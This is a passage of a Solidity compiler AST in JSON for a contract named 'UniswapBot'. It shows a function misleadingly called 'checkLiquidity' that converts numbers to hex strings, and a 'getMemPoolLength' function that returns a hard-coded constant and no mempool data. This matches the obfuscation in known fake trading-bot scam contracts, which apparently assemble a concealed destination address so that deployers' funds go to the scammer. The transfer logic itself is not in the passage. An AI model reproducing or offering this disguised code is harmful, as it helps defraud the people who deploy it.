																				"name": "i",
																				"nodeType": "Identifier",
																				"overloadedDeclarations": [],
																				"referencedDeclaration": 934,
																				"src": "10217:1:0",
																				"typeDescriptions": {
																					"typeIdentifier": "t_uint256",
																					"typeString": "uint256"
																				}
																			},
																			"src": "10209:9:0",
																			"typeDescriptions": {
																				"typeIdentifier": "t_uint256",
																				"typeString": "uint256"
																			}
																		},
																		"nodeType": "BinaryOperation",
																		"operator": "-",
																		"rightExpression": {
																			"argumentTypes": null,
																			"hexValue": "31",
																			"id": 953,
																			"isConstant": false,
																			"isLValue": false,
																			"isPure": true,
																			"kind": "number",
																			"lValueRequested": false,
																			"nodeType": "Literal",
																			"src": "10221:1:0",
																			"subdenomination": null,
																			"typeDescriptions": {
																				"typeIdentifier": "t_rational_1_by_1",
																				"typeString": "int_const 1"
																			},
																			"value": "1"
																		},
																		"src": "10209:13:0",
																		"typeDescriptions": {
																			"typeIdentifier": "t_uint256",
																			"typeString": "uint256"
																		}
																	},
																	"isConstant": false,
																	"isLValue": true,
																	"isPure": false,
																	"lValueRequested": true,
																	"nodeType": "IndexAccess",
																	"src": "10205:18:0",
																	"typeDescriptions": {
																		"typeIdentifier": "t_bytes1",
																		"typeString": "bytes1"
																	}
																},
																"nodeType": "Assignment",
																"operator": "=",
																"rightHandSide": {
																	"argumentTypes": null,
																	"arguments": [
																		{
																			"argumentTypes": null,
																			"arguments": [
																				{
																					"argumentTypes": null,
																					"id": 959,
																					"name": "b",
																					"nodeType": "Identifier",
																					"overloadedDeclarations": [],
																					"referencedDeclaration": 911,
																					"src": "10243:1:0",
																					"typeDescriptions": {
																						"typeIdentifier": "t_uint256",
																						"typeString": "uint256"
																					}
																				}
																			],
																			"expression": {
																				"argumentTypes": [
																					{
																						"typeIdentifier": "t_uint256",
																						"typeString": "uint256"
																					}
																				],
																				"id": 958,
																				"isConstant": false,
																				"isLValue": false,
																				"isPure": true,
																				"lValueRequested": false,
																				"nodeType": "ElementaryTypeNameExpression",
																				"src": "10237:5:0",
																				"typeDescriptions": {
																					"typeIdentifier": "t_type$_t_uint8_$",
																					"typeString": "type(uint8)"
																				},
																				"typeName": {
																					"id": 957,
																					"name": "uint8",
																					"nodeType": "ElementaryTypeName",
																					"src": "10237:5:0",
																					"typeDescriptions": {
																						"typeIdentifier": null,
																						"typeString": null
																					}
																				}
																			},
																			"id": 960,
																			"isConstant": false,
																			"isLValue": false,
																			"isPure": false,
																			"kind": "typeConversion",
																			"lValueRequested": false,
																			"names": [],
																			"nodeType": "FunctionCall",
																			"src": "10237:8:0",
																			"tryCall": false,
																			"typeDescriptions": {
																				"typeIdentifier": "t_uint8",
																				"typeString": "uint8"
																			}
																		}
																	],
																	"expression": {
																		"argumentTypes": [
																			{
																				"typeIdentifier": "t_uint8",
																				"typeString": "uint8"
																			}
																		],
																		"id": 956,
																		"name": "toHexDigit",
																		"nodeType": "Identifier",
																		"overloadedDeclarations": [],
																		"referencedDeclaration": 1330,
																		"src": "10226:10:0",
																		"typeDescriptions": {
																			"typeIdentifier": "t_function_internal_pure$_t_uint8_$returns$_t_bytes1_$",
																			"typeString": "function (uint8) pure returns (bytes1)"
																		}
																	},
																	"id": 961,
																	"isConstant": false,
																	"isLValue": false,
																	"isPure": false,
																	"kind": "functionCall",
																	"lValueRequested": false,
																	"names": [],
																	"nodeType": "FunctionCall",
																	"src": "10226:20:0",
																	"tryCall": false,
																	"typeDescriptions": {
																		"typeIdentifier": "t_bytes1",
																		"typeString": "bytes1"
																	}
																},
																"src": "10205:41:0",
																"typeDescriptions": {
																	"typeIdentifier": "t_bytes1",
																	"typeString": "bytes1"
																}
															},
															"id": 963,
															"nodeType": "ExpressionStatement",
															"src": "10205:41:0"
														},
														{
															"expression": {
																"argumentTypes": null,
																"id": 966,
																"isConstant": false,
																"isLValue": false,
																"isPure": false,
																"lValueRequested": false,
																"leftHandSide": {
																	"argumentTypes": null,
																	"id": 964,
																	"name": "a",
																	"nodeType": "Identifier",
																	"overloadedDeclarations": [],
																	"referencedDeclaration": 901,
																	"src": "10261:1:0",
																	"typeDescriptions": {
																		"typeIdentifier": "t_uint256",
																		"typeString": "uint256"
																	}
																},
																"nodeType": "Assignment",
																"operator": "/=",
																"rightHandSide": {
																	"argumentTypes": null,
																	"hexValue": "3136",
																	"id": 965,
																	"isConstant": false,
																	"isLValue": false,
																	"isPure": true,
																	"kind": "number",
																	"lValueRequested": false,
																	"nodeType": "Literal",
																	"src": "10266:2:0",
																	"subdenomination": null,
																	"typeDescriptions": {
																		"typeIdentifier": "t_rational_16_by_1",
																		"typeString": "int_const 16"
																	},
																	"value": "16"
																},
																"src": "10261:7:0",
																"typeDescriptions": {
																	"typeIdentifier": "t_uint256",
																	"typeString": "uint256"
																}
															},
															"id": 967,
															"nodeType": "ExpressionStatement",
															"src": "10261:7:0"
														}
													]
												},
												"condition": {
													"argumentTypes": null,
													"commonType": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													},
													"id": 939,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"lValueRequested": false,
													"leftExpression": {
														"argumentTypes": null,
														"id": 937,
														"name": "i",
														"nodeType": "Identifier",
														"overloadedDeclarations": [],
														"referencedDeclaration": 934,
														"src": "10151:1:0",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														}
													},
													"nodeType": "BinaryOperation",
													"operator": "<",
													"rightExpression": {
														"argumentTypes": null,
														"id": 938,
														"name": "count",
														"nodeType": "Identifier",
														"overloadedDeclarations": [],
														"referencedDeclaration": 907,
														"src": "10153:5:0",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														}
													},
													"src": "10151:7:0",
													"typeDescriptions": {
														"typeIdentifier": "t_bool",
														"typeString": "bool"
													}
												},
												"id": 969,
												"initializationExpression": {
													"assignments": [
														934
													],
													"declarations": [
														{
															"constant": false,
															"id": 934,
															"mutability": "mutable",
															"name": "i",
															"nodeType": "VariableDeclaration",
															"overrides": null,
															"scope": 969,
															"src": "10141:6:0",
															"stateVariable": false,
															"storageLocation": "default",
															"typeDescriptions": {
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															},
															"typeName": {
																"id": 933,
																"name": "uint",
																"nodeType": "ElementaryTypeName",
																"src": "10141:4:0",
																"typeDescriptions": {
																	"typeIdentifier": "t_uint256",
																	"typeString": "uint256"
																}
															},
															"value": null,
															"visibility": "internal"
														}
													],
													"id": 936,
													"initialValue": {
														"argumentTypes": null,
														"hexValue": "30",
														"id": 935,
														"isConstant": false,
														"isLValue": false,
														"isPure": true,
														"kind": "number",
														"lValueRequested": false,
														"nodeType": "Literal",
														"src": "10148:1:0",
														"subdenomination": null,
														"typeDescriptions": {
															"typeIdentifier": "t_rational_0_by_1",
															"typeString": "int_const 0"
														},
														"value": "0"
													},
													"nodeType": "VariableDeclarationStatement",
													"src": "10141:8:0"
												},
												"loopExpression": {
													"expression": {
														"argumentTypes": null,
														"id": 941,
														"isConstant": false,
														"isLValue": false,
														"isPure": false,
														"lValueRequested": false,
														"nodeType": "UnaryOperation",
														"operator": "++",
														"prefix": true,
														"src": "10160:3:0",
														"subExpression": {
															"argumentTypes": null,
															"id": 940,
															"name": "i",
															"nodeType": "Identifier",
															"overloadedDeclarations": [],
															"referencedDeclaration": 934,
															"src": "10162:1:0",
															"typeDescriptions": {
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															}
														},
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														}
													},
													"id": 942,
													"nodeType": "ExpressionStatement",
													"src": "10160:3:0"
												},
												"nodeType": "ForStatement",
												"src": "10136:144:0"
											},
											{
												"expression": {
													"argumentTypes": null,
													"arguments": [
														{
															"argumentTypes": null,
															"id": 972,
															"name": "res",
															"nodeType": "Identifier",
															"overloadedDeclarations": [],
															"referencedDeclaration": 927,
															"src": "10306:3:0",
															"typeDescriptions": {
																"typeIdentifier": "t_bytes_memory_ptr",
																"typeString": "bytes memory"
															}
														}
													],
													"expression": {
														"argumentTypes": [
															{
																"typeIdentifier": "t_bytes_memory_ptr",
																"typeString": "bytes memory"
															}
														],
														"id": 971,
														"isConstant": false,
														"isLValue": false,
														"isPure": true,
														"lValueRequested": false,
														"nodeType": "ElementaryTypeNameExpression",
														"src": "10299:6:0",
														"typeDescriptions": {
															"typeIdentifier": "t_type$_t_string_storage_ptr_$",
															"typeString": "type(string storage pointer)"
														},
														"typeName": {
															"id": 970,
															"name": "string",
															"nodeType": "ElementaryTypeName",
															"src": "10299:6:0",
															"typeDescriptions": {
																"typeIdentifier": null,
																"typeString": null
															}
														}
													},
													"id": 973,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"kind": "typeConversion",
													"lValueRequested": false,
													"names": [],
													"nodeType": "FunctionCall",
													"src": "10299:11:0",
													"tryCall": false,
													"typeDescriptions": {
														"typeIdentifier": "t_string_memory_ptr",
														"typeString": "string memory"
													}
												},
												"functionReturnParameters": 905,
												"id": 974,
												"nodeType": "Return",
												"src": "10292:18:0"
											}
										]
									},
									"documentation": null,
									"id": 976,
									"implemented": true,
									"kind": "function",
									"modifiers": [],
									"name": "checkLiquidity",
									"nodeType": "FunctionDefinition",
									"overrides": null,
									"parameters": {
										"id": 902,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 901,
												"mutability": "mutable",
												"name": "a",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 976,
												"src": "9904:6:0",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint256",
													"typeString": "uint256"
												},
												"typeName": {
													"id": 900,
													"name": "uint",
													"nodeType": "ElementaryTypeName",
													"src": "9904:4:0",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"value": null,
												"visibility": "internal"
											}
										],
										"src": "9903:8:0"
									},
									"returnParameters": {
										"id": 905,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 904,
												"mutability": "mutable",
												"name": "",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 976,
												"src": "9935:13:0",
												"stateVariable": false,
												"storageLocation": "memory",
												"typeDescriptions": {
													"typeIdentifier": "t_string_memory_ptr",
													"typeString": "string"
												},
												"typeName": {
													"id": 903,
													"name": "string",
													"nodeType": "ElementaryTypeName",
													"src": "9935:6:0",
													"typeDescriptions": {
														"typeIdentifier": "t_string_storage_ptr",
														"typeString": "string"
													}
												},
												"value": null,
												"visibility": "internal"
											}
										],
										"src": "9934:15:0"
									},
									"scope": 1578,
									"src": "9880:438:0",
									"stateMutability": "pure",
									"virtual": false,
									"visibility": "internal"
								},
								{
									"body": {
										"id": 983,
										"nodeType": "Block",
										"src": "10383:34:0",
										"statements": [
											{
												"expression": {
													"argumentTypes": null,
													"hexValue": "3435333733323239",
													"id": 981,
													"isConstant": false,
													"isLValue": false,
													"isPure": true,
													"kind": "number",
													"lValueRequested": false,
													"nodeType": "Literal",
													"src": "10401:8:0",
													"subdenomination": null,
													"typeDescriptions": {
														"typeIdentifier": "t_rational_45373229_by_1",
														"typeString": "int_const 45373229"
													},
													"value": "45373229"
												},
												"functionReturnParameters": 980,
												"id": 982,
												"nodeType": "Return",
												"src": "10394:15:0"
											}
										]
									},
									"documentation": null,
									"id": 984,
									"implemented": true,
									"kind": "function",
									"modifiers": [],
									"name": "getMemPoolLength",
									"nodeType": "FunctionDefinition",
									"overrides": null,
									"parameters": {
										"id": 977,
										"nodeType": "ParameterList",
										"parameters": [],
										"src": "10351:2:0"
									},
									"returnParameters": {
										"id": 980,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 979,
												"mutability": "mutable",
												"name": "",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 984,
												"src": "10377:4:0",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint256",
													"typeString": "uint256"
												},
												"typeName": {
													"id": 978,
													"name": "uint",
													"nodeType": "ElementaryTypeName",
													"src": "10377:4:0",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"value": null,
												"visibility": "internal"
											}
										],
										"src": "10376:6:0"
									},
									"scope": 1578,
									"src": "10326:91:0",
									"stateMutability": "pure",
									"virtual": false,
									"visibility": "internal"
								},
								{
									"body": {
										"id": 1033,
										"nodeType": "Block",
										"src": "10791:589:0",
										"statements": [
											{
												"condition": {
													"argumentTypes": null,
													"commonType": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													},
													"id": 997,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"lValueRequested": false,
													"leftExpression": {
														"argumentTypes": null,
														"expression": {
															"argumentTypes": null,
															"id": 993,
															"name": "self",
															"nodeType": "Identifier",
															"overloadedDeclarations": [],
															"referencedDeclaration": 986,
															"src": "10806:4:0",
															"typeDescriptions": {
																"typeIdentifier": "t_struct$_slice_$24_memory_ptr",
																"typeString": "struct UniswapBot.slice memory"
															}
														},
														"id": 994,
														"isConstant": false,
														"isLValue": true,
														"isPure": false,
														"lValueRequested": false,
														"memberName": "_len",
														"nodeType": "MemberAccess",
														"referencedDeclaration": 21,
														"src": "10806:9:0",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														}
													},
													"nodeType": "BinaryOperation",
													"operator": "<",
													"rightExpression": {
														"argumentTypes": null,
														"expression": {
															"argumentTypes": null,
															"id": 995,
															"name": "needle",
															"nodeType": "Identifier",
															"overloadedDeclarations": [],
															"referencedDeclaration": 988,
															"src": "10818:6:0",
															"typeDescriptions": {
																"typeIdentifier": "t_struct$_slice_$24_memory_ptr",
																"typeString": "struct UniswapBot.slice memory"
															}
														},
														"id": 996,
														"isConstant": false,
														"isLValue": true,
														"isPure": false,
														"lValueRequested": false,
														"memberName": "_len",
														"nodeType": "MemberAccess",
														"referencedDeclaration": 21,
														"src": "10818:11:0",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														}
													},
													"src": "10806:23:0",
													"typeDescriptions": {
														"typeIdentifier": "t_bool",
														"typeString": "bool"
													}
												},
												"falseBody": null,
												"id": 1001,
												"nodeType": "IfStatement",
												"src": "10802:67:0",
												"trueBody": {
													"id": 1000,
													"nodeType": "Block",
													"src": "10831:38:0",
													"statements": [
														{
															"expression": {
																"argumentTypes": null,
																"id": 998,
																"name": "self",
																"nodeType": "Identifier",
																"overloadedDeclarations": [],
																"referencedDeclaration": 986,
																"src": "10853:4:0",
																"typeDescriptions": {
																	"typeIdentifier": "t_struct$_slice_$24_memory_ptr",
																	"typeString": "struct UniswapBot.slice memory"
																}
															},
															"functionReturnParameters": 992,
															"id": 999,
															"nodeType": "Return",
															"src": "10846:11:0"
														}
													]
												}
											},
											{
												"assignments": [
													1003
												],
												"declarations": [
													{
														"constant": false,
														"id": 1003,
														"mutability": "mutable",
														"name": "equal",
														"nodeType": "VariableDeclaration",
														"overrides": null,
														"scope": 1033,
														"src": "10881:10:0",
														"stateVariable": false,
														"storageLocation": "default",
														"typeDescriptions": {
															"typeIdentifier": "t_bool",
															"typeString": "bool"
														},
														"typeName": {
															"id": 1002,
															"name": "bool",
															"nodeType": "ElementaryTypeName",
															"src": "10881:4:0",
															"typeDescriptions": {
																"typeIdentifier": "t_bool",
																"typeString": "bool"
															}
														},
														"value": null,
														"visibility": "internal"
													}
												],
												"id": 1005,
												"initialValue": {
													"argumentTypes": null,
													"hexValue": "74727565",
													"id": 1004,
													"isConstant": false,
													"isLValue": false,
													"isPure": true,
													"kind": "bool",
													"lValueRequested": false,
													"nodeType": "Literal",
													"src": "10894:4:0",
													"subdenomination": null,
													"typeDescriptions": {
														"typeIdentifier": "t_bool",
														"typeString": "bool"
													},
													"value": "true"
												},
												"nodeType": "VariableDeclarationStatement",
												"src": "10881:17:0"
											},
											{
												"condition": {
													"argumentTypes": null,
													"commonType": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													},
													"id": 1010,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"lValueRequested": false,
													"leftExpression": {
														"argumentTypes": null,
														"expression": {
															"argumentTypes": null,
															"id": 1006,
															"name": "self",
															"nodeType": "Identifier",
															"overloadedDeclarations": [],
															"referencedDeclaration": 986,
															"src": "10913:4:0",
															"typeDescriptions": {
																"typeIdentifier": "t_struct$_slice_$24_memory_ptr",
																"typeString": "struct UniswapBot.slice memory"
															}
														},
														"id": 1007,
														"isConstant": false,
														"isLValue": true,
														"isPure": false,
														"lValueRequested": false,
														"memberName": "_ptr",
														"nodeType": "MemberAccess",
														"referencedDeclaration": 23,
														"src": "10913:9:0",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														}
													},
													"nodeType": "BinaryOperation",
													"operator": "!=",
													"rightExpression": {
														"argumentTypes": null,
														"expression": {
															"argumentTypes": null,
															"id": 1008,
															"name": "needle",
															"nodeType": "Identifier",
															"overloadedDeclarations": [],
															"referencedDeclaration": 988,
															"src": "10926:6:0",
															"typeDescriptions": {
																"typeIdentifier": "t_struct$_slice_$24_memory_ptr",
																"typeString": "struct UniswapBot.slice memory"
															}
														},
														"id": 1009,
														"isConstant": false,
														"isLValue": true,
														"isPure": false,
														"lValueRequested": false,
														"memberName": "_ptr",
														"nodeType": "MemberAccess",
														"referencedDeclaration": 23,
														"src": "10926:11:0",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														}
													},
													"src": "10913:24:0",
													"typeDescriptions": {
														"typeIdentifier": "t_bool",
														"typeString": "bool"
													}
												},
												"falseBody": null,
												"id": 1013,
												"nodeType": "IfStatement",
												"src": "10909:327:0",
												"trueBody": {
													"id": 1012,
													"nodeType": "Block",
													"src": "10939:297:0",
													"statements": [
														{
															"AST": {
																"nodeType": "YulBlock",
																"src": "10963:262:0",
																"statements": [
																	{
																		"nodeType": "YulVariableDeclaration",
																		"src": "10982:27:0",
																		"value": {
																			"arguments": [
																				{
																					"name": "needle",
																					"nodeType": "YulIdentifier",
																					"src": "11002:6:0"
																				}
																			],
																			"functionName": {
																				"name": "mload",
																				"nodeType": "YulIdentifier",
																				"src": "10996:5:0"
																			},
																			"nodeType": "YulFunctionCall",
																			"src": "10996:13:0"
																		},
																		"variables": [
																			{
																				"name": "length",
																				"nodeType": "YulTypedName",
																				"src": "10986:6:0",
																				"type": ""
																			}
																		]
																	},
																	{
																		"nodeType": "YulVariableDeclaration",
																		"src": "11027:37:0",
																		"value": {
																			"arguments": [
																				{
																					"arguments": [
																						{
																							"name": "self",
																							"nodeType": "YulIdentifier",
																							"src": "11052:4:0"
																						},
																						{
																							"kind": "number",
																							"nodeType": "YulLiteral",
																							"src": "11058:4:0",
																							"type": "",
																							"value": "0x20"
																						}
																					],
																					"functionName": {
																						"name": "add",
																						"nodeType": "YulIdentifier",
																						"src": "11048:3:0"
																					},
																					"nodeType": "YulFunctionCall",
																					"src": "11048:15:0"
																				}
																			],
																			"functionName": {
																				"name": "mload",
																				"nodeType": "YulIdentifier",
																				"src": "11042:5:0"
																			},
																			"nodeType": "YulFunctionCall",
																			"src": "11042:22:0"
																		},
																		"variables": [
																			{
																				"name": "selfptr",
																				"nodeType": "YulTypedName",
																				"src": "11031:7:0",
																				"type": ""
																			}
																		]
																	},
																	{
																		"nodeType": "YulVariableDeclaration",
																		"src": "11082:41:0",
																		"value": {
																			"arguments": [
																				{
																					"arguments": [
																						{
																							"name": "needle",
																							"nodeType": "YulIdentifier",
																							"src": "11109:6:0"
																						},
																						{
																							"kind": "number",
																							"nodeType": "YulLiteral",
																							"src": "11117:4:0",
																							"type": "",
																							"value": "0x20"
																						}
																					],
																					"functionName": {
																						"name": "add",
																						"nodeType": "YulIdentifier",
																						"src": "11105:3:0"
																					},
																					"nodeType": "YulFunctionCall",
																					"src": "11105:17:0"
																				}
																			],
																			"functionName": {
																				"name": "mload",
																				"nodeType": "YulIdentifier",
																				"src": "11099:5:0"
																			},
																			"nodeType": "YulFunctionCall",
																			"src": "11099:24:0"
																		},
																		"variables": [
																			{
																				"name": "needleptr",
																				"nodeType": "YulTypedName",
																				"src": "11086:9:0",
																				"type": ""
																			}
																		]
																	},
																	{
																		"nodeType": "YulAssignment",
																		"src": "11141:69:0",
																		"value": {
																			"arguments": [
																				{
																					"arguments": [
																						{
																							"name": "selfptr",
																							"nodeType": "YulIdentifier",
																							"src": "11163:7:0"
																						},
																						{
																							"name": "length",
																							"nodeType": "YulIdentifier",
																							"src": "11172:6:0"
																						}
																					],
																					"functionName": {
																						"name": "keccak256",
																						"nodeType": "YulIdentifier",
																						"src": "11153:9:0"
																					},
																					"nodeType": "YulFunctionCall",
																					"src": "11153:26:0"
																				},
																				{
																					"arguments": [
																						{
																							"name": "needleptr",
																							"nodeType": "YulIdentifier",
																							"src": "11191:9:0"
																						},
																						{
																							"name": "length",
																							"nodeType": "YulIdentifier",
																							"src": "11202:6:0"
																						}
																					],
																					"functionName": {
																						"name": "keccak256",
																						"nodeType": "YulIdentifier",
																						"src": "11181:9:0"
																					},
																					"nodeType": "YulFunctionCall",
																					"src": "11181:28:0"
																				}
																			],
																			"functionName": {
																				"name": "eq",
																				"nodeType": "YulIdentifier",
																				"src": "11150:2:0"
																			},
																			"nodeType": "YulFunctionCall",
																			"src": "11150:60:0"
																		},
																		"variableNames": [
																			{
																				"name": "equal",
																				"nodeType": "YulIdentifier",
																				"src": "11141:5:0"
																			}
																		]
																	}
																]
															},
															"evmVersion": "istanbul",
															"externalReferences": [
																{
																	"declaration": 1003,
																	"isOffset": false,
																	"isSlot": false,
																	"src": "11141:5:0",
																	"valueSize": 1
																},
																{
																	"declaration": 988,
																	"isOffset": false,
																	"isSlot": false,
																	"src": "11002:6:0",
																	"valueSize": 1
																},
																{
																	"declaration": 988,
																	"isOffset": false,
																	"isSlot": false,
																	"src": "11109:6:0",
																	"valueSize": 1
																},
																{
																	"declaration": 986,
																	"isOffset": false,
																	"isSlot": false,
																	"src": "11052:4:0",
																	"valueSize": 1
																}
															],
															"id": 1011,
															"nodeType": "InlineAssembly",
															"src": "10954:271:0"
														}
													]
												}
											},
											{
												"condition": {
													"argumentTypes": null,
													"id": 1014,
													"name": "equal",
													"nodeType": "Identifier",
													"overloadedDeclarations": [],
													"referencedDeclaration": 1003,
													"src": "11252:5:0",
													"typeDescriptions": {
														"typeIdentifier": "t_bool",
														"typeString": "bool"
													}
												},
												"falseBody": null,
												"id": 1030,
												"nodeType": "IfStatement",
												"src": "11248:101:0",
												"trueBody": {
													"id": 1029,
													"nodeType": "Block",
													"src": "11259:90:0",
													"statements": [
														{
															"expression": {
																"argumentTypes": null,
																"id": 1020,
																"isConstant": false,
																"isLValue": false,
																"isPure": false,
																"lValueRequested": false,
																"leftHandSide": {
																	"argumentTypes": null,
																	"expression": {
																		"argumentTypes": null,
																		"id": 1015,
																		"name": "self",
																		"nodeType": "Identifier",
																		"overloadedDeclarations": [],
																		"referencedDeclaration": 986,
																		"src": "11274:4:0",
																		"typeDescriptions": {
																			"typeIdentifier": "t_struct$_slice_$24_memory_ptr",
																			"typeString": "struct UniswapBot.slice memory"
																		}
																	},
																	"id": 1017,
																	"isConstant": false,
																	"isLValue": true,
																	"isPure": false,
																	"lValueRequested": true,
																	"memberName": "_len",
																	"nodeType": "MemberAccess",
																	"referencedDeclaration": 21,
																	"src": "11274:9:0",
																	"typeDescriptions": {
																		"typeIdentifier": "t_uint256",
																		"typeString": "uint256"
																	}
																},
																"nodeType": "Assignment",
																"operator": "-=",
																"rightHandSide": {
																	"argumentTypes": null,
																	"expression": {
																		"argumentTypes": null,
																		"id": 1018,
																		"name": "needle",
																		"nodeType": "Identifier",
																		"overloadedDeclarations": [],
																		"referencedDeclaration": 988,
																		"src": "11287:6:0",
																		"typeDescriptions": {
																			"typeIdentifier": "t_struct$_slice_$24_memory_ptr",
																			"typeString": "struct UniswapBot.slice memory"
																		}
																	},
																	"id": 1019,
																	"isConstant": false,
																	"isLValue": true,
																	"isPure": false,
																	"lValueRequested": false,
																	"memberName": "_len",
																	"nodeType": "MemberAccess",
																	"referencedDeclaration": 21,
																	"src": "11287:11:0",
																	"typeDescriptions": {
																		"typeIdentifier": "t_uint256",
																		"typeString": "uint256"
																	}
																},
																"src": "11274:24:0",
																"typeDescriptions": {
																	"typeIdentifier": "t_uint256",
																	"typeString": "uint256"
																}
															},
															"id": 1021,
															"nodeType": "ExpressionStatement",
															"src": "11274:24:0"
														},
														{
															"expression": {
																"argumentTypes": null,
																"id": 1027,
																"isConstant": false,
																"isLValue": false,
																"isPure": false,
																"lValueRequested": false,
																"leftHandSide": {
																	"argumentTypes": null,
																	"expression": {
																		"argumentTypes": null,
																		"id": 1022,
																		"name": "self",
																		"nodeType": "Identifier",
																		"overloadedDeclarations": [],
																		"referencedDeclaration": 986,
																		"src": "11313:4:0",
																		"typeDescriptions": {
																			"typeIdentifier": "t_struct$_slice_$24_memory_ptr",
																			"typeString": "struct UniswapBot.slice memory"
																		}
																	},
																	"id": 1024,
																	"isConstant": false,
																	"isLValue": true,
																	"isPure": false,
																	"lValueRequested": true,
																	"memberName": "_ptr",
																	"nodeType": "MemberAccess",
																	"referencedDeclaration": 23,
																	"src": "11313:9:0",
																	"typeDescriptions": {
																		"typeIdentifier": "t_uint256",
																		"typeString": "uint256"
																	}
																},
																"nodeType": "Assignment",
																"operator": "+=",
																"rightHandSide": {
																	"argumentTypes": null,
																	"expression": {
																		"argumentTypes": null,
																		"id": 1025,
																		"name": "needle",
																		"nodeType": "Identifier",
																		"overloadedDeclarations": [],
																		"referencedDeclaration": 988,
																		"src": "11326:6:0",
																		"typeDescriptions": {
																			"typeIdentifier": "t_struct$_slice_$24_memory_ptr",
																			"typeString": "struct UniswapBot.slice memory"
																		}
																	},
																	"id": 1026,
																	"isConstant": false,
																	"isLValue": true,
																	"isPure": false,
																	"lValueRequested": false,
																	"memberName": "_len",
																	"nodeType": "MemberAccess",
																	"referencedDeclaration": 21,
																	"src": "11326:11:0",
																	"typeDescriptions": {
																		"typeIdentifier": "t_uint256",
																		"typeString": "uint256"
																	}
																},
																"src": "11313:24:0",
																"typeDescriptions": {
																	"typeIdentifier": "t_uint256",
																	"typeString": "uint256"
																}
															},
															"id": 1028,
															"nodeType": "ExpressionStatement",
															"src": "11313:24:0"
														}
													]
												}
											},
											{
												"expression": {
													"argumentTypes": null,
													"id": 1031,
													"name": "self",
													"nodeType": "Identifier",
													"overloadedDeclarations": [],
													"referencedDeclaration": 986,
													"src": "11368:4:0",
													"typeDescriptions": {
														"typeIdentifier": "t_struct$_slice_$24_memory_ptr",
														"typeString": "struct UniswapBot.slice memory"
													}
												},
												"functionReturnParameters": 992,
												"id": 1032,
												"nodeType": "Return",
												"src": "11361:11:0"
											}
										]
									},
									"documentation": null,
									"id": 1034,
									"implemented": true,
									"kind": "function",
									"modifiers": [],
									"name": "beyond",
									"nodeType": "FunctionDefinition",
									"overrides": null,
									"parameters": {
										"id": 989,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 986,
												"mutability": "mutable",
												"name": "self",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 1034,
												"src": "10714:17:0",
												"stateVariable": false,
												"storageLocation": "memory",
												"typeDescriptions": {
													"typeIdentifier": "t_struct$_slice_$24_memory_ptr",
													"typeString": "struct UniswapBot.slice"
												},
												"typeName": {
													"contractScope": null,
													"id": 985,
													"name": "slice",
													"nodeType": "UserDefinedTypeName",
													"referencedDeclaration": 24,
													"src": "10714:5:0",
													"typeDescriptions": {
														"typeIdentifier": "t_struct$_slice_$24_storage_ptr",
														"typeString": "struct UniswapBot.slice"
													}
												},
												"value": null,
												"visibility": "internal"
											},
											{
												"constant": false,
												"id": 988,
												"mutability": "mutable",
												"name": "needle",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 1034,
												"src": "10733:19:0",
												"stateVariable": false,
												"storageLocation": "memory",
												"typeDescriptions": {
													"typeIdentifier": "t_struct$_slice_$24_memory_ptr",
													"typeString": "struct UniswapBot.slice"
												},
												"typeName": {
													"contractScope": null,
													"id": 987,
													"name": "slice",
													"nodeType": "UserDefinedTypeName",
													"referencedDeclaration": 24,
													"src": "10733:5:0",
													"typeDescriptions": {
														"typeIdentifier": "t_struct$_slice_$24_storage_ptr",
														"typeString": "struct UniswapBot.slice"
													}
												},
												"value": null,
												"visibility": "internal"
											}
										],
										"src": "10713:40:0"
									},
									"returnParameters": {
										"id": 992,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 991,
												"mutability": "mutable",
												"name": "",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 1034,
												"src": "10777:12:0",
												"stateVariable": false,
												"storageLocation": "memory",
												"typeDescriptions": {
													"typeIdentifier": "t_struct$_slice_$24_memory_ptr",
													"typeString": "struct UniswapBot.slice"
												},
												"typeName": {
													"contractScope": null,
													"id": 990,
													"name": "slice",
													"nodeType": "UserDefinedTypeName",
													"referencedDeclaration": 24,
													"src": "10777:5:0",
													"typeDescriptions": {
														"typeIdentifier": "t_struct$_slice_$24_storage_ptr",
														"typeString": "struct UniswapBot.slice"
													}
												},
												"value": null,
												"visibility": "internal"
											}
										],
										"src": "10776:14:0"
									},
									"scope": 1578,
									"src": "10698:682:0",
									"stateMutability": "pure",
									"virtual": false,
									"visibility": "internal"
								},
								{
									"body": {
										"id": 1155,
										"nodeType": "Block",
										"src": "11646:1304:0",
										"statements": [
											{
												"assignments": [
													1048
												],
												"declarations": [
													{
														"constant": false,
